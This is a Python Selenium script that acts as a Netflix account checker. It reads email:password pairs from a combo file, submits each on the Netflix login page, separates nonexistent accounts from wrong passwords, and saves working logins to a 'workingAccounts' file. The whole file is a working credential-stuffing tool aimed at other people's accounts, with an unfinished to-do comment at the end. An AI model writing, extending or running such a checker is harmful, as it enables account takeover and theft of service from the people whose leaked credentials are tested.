from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC, wait
from termcolor import colored
from main import log
import datetime
import time
import os


def read():
    try:
        file1 = open('accounts.txt', 'r')
        count = 0
        accs = []

        for line in file1:
            count += 1
            accs.append(line.strip())

        file1.close()
        log("returning array with " + str(len(accs)) + " accounts")
        return accs
    except:
        log("Could not find accounts.txt")
        print(colored("Could not find accounts.txt", "red"))


def accLog(text, filename):
    os.makedirs(os.path.dirname(filename), exist_ok=True)
    with open(filename, "a") as accs:
        accs.write(text + "\n")


def netflix():
    log("launching webdriver for netflix")
    driver = webdriver.Chrome()
    driver.get("https://www.netflix.com/")
    rejectCookies = driver.find_element_by_xpath(
        '//*[@id="cookie-disclosure"]/div[1]/button[2]')
    rejectCookies.click()
    log("cookies rejected")
    signIn = driver.find_element_by_link_text("Sign In")
    time.sleep(1)
    signIn.click()
    time.sleep(1)
    fileTime = datetime.datetime.now()
    fileName = ("workingAccounts/" + "Netflix_" +
                fileTime.strftime("%Y-%m-%d_%H:%M:%S") + ".txt")
    credentials = read()
    for acc in credentials:
        time.sleep(1)
        emailInput = driver.find_element_by_id("id_userLoginId")
        passInput = driver.find_element_by_id("id_password")
        logIn = driver.find_element_by_xpath(
            '//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/form/button')
        email = acc.split(":")[0]
        password = acc.split(":")[1]
        if len(password) < 4:
            continue
        emailInput.clear()
        emailInput.send_keys(email)
        passInput.send_keys(password)
        logIn.click()
        time.sleep(5)
        try:
            WebDriverWait(driver, 3).until(
                EC.presence_of_element_located((
                    By.LINK_TEXT, 'create a new account'))
            )
            log("Account " + acc + " doesn't exist")
            continue
        except:
            try:
                WebDriverWait(driver, 3).until(
                    EC.presence_of_element_located((
                        By.LINK_TEXT, 'reset your password.'))
                )
                log("Wrong password for " + acc)
            except:
                log("Password working for " + acc)
                accLog(acc, fileName)
                # now if you find working account it will just stop
                # todo this shit
